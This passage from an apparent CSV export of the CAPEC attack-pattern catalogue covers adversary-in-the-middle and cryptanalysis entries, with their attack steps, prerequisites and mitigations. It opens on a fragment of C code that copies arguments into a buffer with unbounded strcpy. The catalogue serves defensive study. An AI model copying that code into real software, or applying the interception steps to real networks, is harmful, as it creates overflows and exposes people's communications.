*)malloc(total);strcpy(buff, argv[1]);strcpy(buff, argv[2]); } [REF-547], [REF-548]::",::190::128::120::122::196::680::697::,TAXONOMY NAME:WASC:ENTRY ID:03:ENTRY NAME:Integer Overflows::,N/A,https://capec.mitre.org/data/definitions/92.html
CAPEC-94,Adversary in the Middle (AiTM),Meta,Stable,"An adversary targets the communication between two components (typically client and server), in order to alter or obtain data from transactions. A general approach entails the adversary placing themself within the communication channel between the two components.",::TERM:Man-in-the-Middle / MITM:DESCRIPTION:::TERM:Person-in-the-Middle / PiTM:DESCRIPTION:::TERM:Monkey-in-the-Middle:DESCRIPTION:::TERM:Monster-in-the-Middle:DESCRIPTION:::TERM:On-path Attacker:DESCRIPTION:::,High,Very High,::NATURE:CanPrecede:CAPEC ID:151::NATURE:CanPrecede:CAPEC ID:668::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine Communication Mechanism] The adversary determines the nature and mechanism of communication between two components, looking for opportunities to exploit.TECHNIQUE:Perform a sniffing attack and observe communication to determine a communication protocol.:TECHNIQUE:Look for application documentation that might describe a communication mechanism used by a target.::STEP:2:PHASE:Experiment:DESCRIPTION:[Position In Between Targets] The adversary inserts themself into the communication channel initially acting as a routing proxy between the two targeted components.TECHNIQUE:Install spyware on a client that will intercept outgoing packets and route them to their destination as well as route incoming packets back to the client.:TECHNIQUE:Exploit a weakness in an encrypted communication mechanism to gain access to traffic. Look for outdated mechanisms such as SSL.::STEP:3:PHASE:Exploit:DESCRIPTION:[Use Intercepted Data Maliciously] The adversary observes, filters, or alters passed data of its choosing to gain access to sensitive information or to manipulate the actions of the two target components for their own purposes.TECHNIQUE:Prevent some messages from reaching their destination, causing a denial of service.::",::There are two components communicating with each other.::An attacker is able to identify the nature and mechanism of communication between the two target components.::An attacker can eavesdrop on the communication between the target components.::Strong mutual authentication is not used between the two target components yielding opportunity for attacker interposition.::The communication occurs in clear (not encrypted) or with insufficient and spoofable encryption.::,::SKILL:This attack can get sophisticated since the attack may use cryptography.:LEVEL:Medium::,N/A,N/A,::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::,"::Ensure Public Keys are signed by a Certificate Authority::Encrypt communications using cryptography (e.g., SSL/TLS)::Use Strong mutual authentication to always fully authenticate both ends of any communications channel.::Exchange public keys using a secure channel::","::In 2017, security researcher Jerry Decime discovered that Equifax mobile applications were not leveraging HTTPS in all areas. Although authentication was properly utilizing HTTPS, in addition to validating the root of trust of the server certificate, other areas of the application were using HTTP to communicate. Adversaries could then conduct MITM attacks on rogue WiFi or cellular networks and hijack the UX. This further allowed the adversaries to prompt users for sensitive data, which could then be obtained in the plaintext response. [REF-636]::",::300::290::593::287::294::,TAXONOMY NAME:ATTACK:ENTRY ID:1557:ENTRY NAME:Man-in-the-Middle::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Man-in-the-middle attack::,N/A,https://capec.mitre.org/data/definitions/94.html
CAPEC-97,Cryptanalysis,Standard,Draft,"Cryptanalysis is a process of finding weaknesses in cryptographic algorithms and using these weaknesses to decipher the ciphertext without knowing the secret key (instance deduction). Sometimes the weakness is not in the cryptographic algorithm itself, but rather in how it is applied that makes cryptanalysis successful. An attacker may have other goals as well, such as: Total Break (finding the secret key), Global Deduction (finding a functionally equivalent algorithm for encryption and decryption that does not require knowledge of the secret key), Information Deduction (gaining some information about plaintexts or ciphertexts that was not previously known) and Distinguishing Algorithm (the attacker has the ability to distinguish the output of the encryption (ciphertext) from a random permutation of bits).",N/A,Low,Very High,::NATURE:ChildOf:CAPEC ID:192::NATURE:CanPrecede:CAPEC ID:20::,"::STEP:1:PHASE:Explore:DESCRIPTION:An attacker discovers a weakness in the cryptographic algorithm or a weakness in how it was applied to a particular chunk of plaintext.::STEP:2:PHASE:Exploit:DESCRIPTION:An attacker leverages the discovered weakness to decrypt, partially decrypt or infer some information about the contents of the encrypted message. All of that is done without knowing the secret key.::",::The target software utilizes some sort of cryptographic algorithm.::An underlying weaknesses exists either in the cryptographic algorithm used or in the way that it was applied to a particular chunk of plaintext.::The encryption algorithm is known to the attacker.::An attacker has access to the ciphertext.::,::SKILL:Cryptanalysis generally requires a very significant level of understanding of mathematics and computation.:LEVEL:High::,::Computing resource requirements will vary based on the complexity of a given cryptanalysis technique. Access to the encryption/decryption routines of the algorithm is also required.::,N/A,"::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data In most cases, if cryptanalysis is successful at all, an adversary will not be able to decrypt the entire message, but instead will only be able to deduce some information about the plaintext. However, that may be sufficient for an adversary, depending on the context of the attack.::",::Use proven cryptographic algorithms with recommended key sizes.::Ensure that the algorithms are used properly. That means: 1. Not rolling out your own crypto; Use proven algorithms and implementations. 2. Choosing initialization vectors with sufficiently random numbers 3. Generating key material using good sources of randomness and avoiding known weak keys 4. Using proven protocols and their implementations. 5. Picking the most appropriate cryptographic algorithm for your usage context and data::,"::A very easy to understand example is a cryptanalysis technique called frequency analysis that can be successfully applied to the very basic classic encryption algorithms that performed mono-alphabetic substitution replacing each letter in the plaintext with its predetermined mapping letter from the same alphabet. This was considered an improvement over a more basic technique that would simply shift all of the letters of the plaintext by some constant number of positions and replace the original letters with the new letter with the resultant alphabet position. While mono-alphabetic substitution ciphers are resilient to blind brute force, they can be broken easily with nothing more than a pen and paper. Frequency analysis uses the fact that natural language is not random and mono-alphabetic substitution does not hide the statistical properties of the natural language. So if the letter E in an English language occurs with a certain known frequency (about 12.7%), whatever E was substituted with to get to the ciphertext, will occur with the similar frequency. Having this frequency information allows the cryptanalyst to quickly determine the substitutions and decipher the ciphertext. Frequency analysis techniques are not applicable to modern ciphers as they are all resilient to it (unless this is a very bad case of a homegrown encryption algorithm). This example is inapplicable to modern cryptographic ciphers but is here to illustrate a rudimentary example of cryptanalysis.::",::327::1204::1240::1241::1279::,TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Cryptanalysis::,N/A,https://capec.mitre.org/data/definitions/97.html
